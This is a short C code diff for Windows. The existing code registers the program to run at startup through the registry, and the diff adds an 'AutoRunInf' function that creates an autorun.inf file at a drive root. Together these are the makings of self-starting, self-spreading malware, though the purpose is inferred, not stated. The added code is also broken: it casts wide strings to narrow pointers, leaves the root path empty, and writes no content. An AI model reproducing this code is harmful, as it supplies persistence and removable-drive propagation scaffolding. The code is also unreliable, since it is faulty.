@@ -59,6 +59,7 @@ BOOL RegisterMyProgramForStartup(PCWSTR pszAppName, PCWSTR pathToExe, PCWSTR arg
 	if (fSuccess)
 	{
 		dwSize = (wcslen(szValue) + 1) * 2;
+
 		lResult = RegSetValueExW(hKey, pszAppName, 0, REG_SZ, (BYTE*)szValue, dwSize);
 		fSuccess = (lResult == 0);
 	}
@@ -78,4 +79,16 @@ void RegisterProgram()
 
 	GetModuleFileNameW(NULL, szPathToExe, MAX_PATH);
 	RegisterMyProgramForStartup(L"My_Program", szPathToExe, L"-foobar");
+}
+
+void AutoRunInf()
+{
+	wchar_t szRoot[4] = { 0 };
+
+	wchar_t szTarget[MAX_PATH] = { 0 };
+	lstrcpy((LPSTR)szTarget, (LPSTR)szRoot);
+	lstrcat((LPSTR)szTarget, (LPSTR)"autorun.inf");
+	HANDLE hFile = CreateFile((LPSTR)szTarget,
+		GENERIC_WRITE, 0, NULL, CREATE_ALWAYS,
+		FILE_ATTRIBUTE_NORMAL, NULL);
 }
